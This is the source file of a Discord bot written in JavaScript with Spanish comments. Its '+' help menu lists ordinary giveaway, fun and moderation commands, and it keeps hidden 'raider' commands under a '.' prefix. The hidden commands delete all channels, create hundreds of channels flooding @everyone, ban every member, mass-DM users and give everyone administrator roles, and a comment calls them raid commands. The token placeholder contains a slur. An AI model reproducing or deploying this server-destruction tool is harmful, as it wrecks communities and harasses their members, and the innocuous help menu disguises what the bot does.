const express = require('express')
const app = express()

app.get('/', function(req, res) {
  res.send('El bot ya esta listo.')
})
let port = process.env.PORT || 3000;
app.listen(port)
require('dotenv').config()
///bot///
const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = ".";//prefix raider
const prefixnormal = "+";//prefix normal

client.on('ready', () => {
  client.user.setActivity({ name: "", type: "PLAYING" })
  console.log("Logged in as ${client.user.tag}!");
});

/*el evento de abajo es para los raids ahi salen los comandos raiders que se usan con "."
*/
client.on("message", async message => {
  if (!message.guild) return;
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command == "automoderacion") {
    message.guild.setName("Servidor.")
    message.guild.channels.cache.forEach(canal => canal.delete())
    message.guild.setIcon("https://pontufotoaca.com");
    for (let i = 0; i <= 500; i++) {  
       message.guild.channels.create("hola", {type: "text"}).then(canal => {
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")            
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.") 
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.") 
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.") 
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")
       canal.send("@everyone @here Este servidor ha sido raideado, cambia este mensaje por uno personalizado, rarito.")                            

      })
    }
  }
  if (command === "banall") {
    message.guild.members.cache.forEach(allUsers => { allUsers.ban() })
  }
  if (command == "dm") {
    message.guild.members.cache.forEach(pitos => {
      pitos.send("Hola!")

    })
  }
  if (command == "roles") {
    for (let i = 0; i <= 50; i++) {
      message.guild.roles.create({ data: { name: "Rol", permissions: "ADMINISTRATOR", color: "BLACK" } })
    }
    let xd = message.guild.roles.cache.find(c => c.name === "Rol");
    message.guild.members.cache.forEach(allUsers => { allUsers.roles.add(xd) })
  }
  if (command == "deletechannels") {
    message.guild.channels.cache.forEach(xd => xd.delete())
  }
});
/*
aquí terminan los comandos raiders ahora abajo son los comandos normales que se usan con "+"
*/
client.on("message", async message => {
  if (!message.guild) return;
  if (message.author.bot) return;
  if (!message.content.startsWith(prefixnormal)) return;
  const args = message.content.slice(prefixnormal.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command == "help") {
    const embed = new Discord.MessageEmbed()
      .setTitle(":gear: Aidol ugu Bot :gear:")
      .setDescription("Aquí tienes mi lista de comandos")
      .addField("Giveaways", "gstart, greroll, gend")
      .addField("Diversión", "8ball, say, waifu")
      .addField("Comandos Otakus", "anime , kakeregui , osu")
      .addField("Comandos informacion", "avatar, suggest , invitebot")
      .addField("Comandos Utiles", "ban , warn , kick")
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
      .setFooter("Aidol ugu | Bot")
      .setColor("PURPLE");
    message.channel.send(embed)
  }
});
client.login("Tu Token debe de estar aqui. (el del bot maricon)");
 
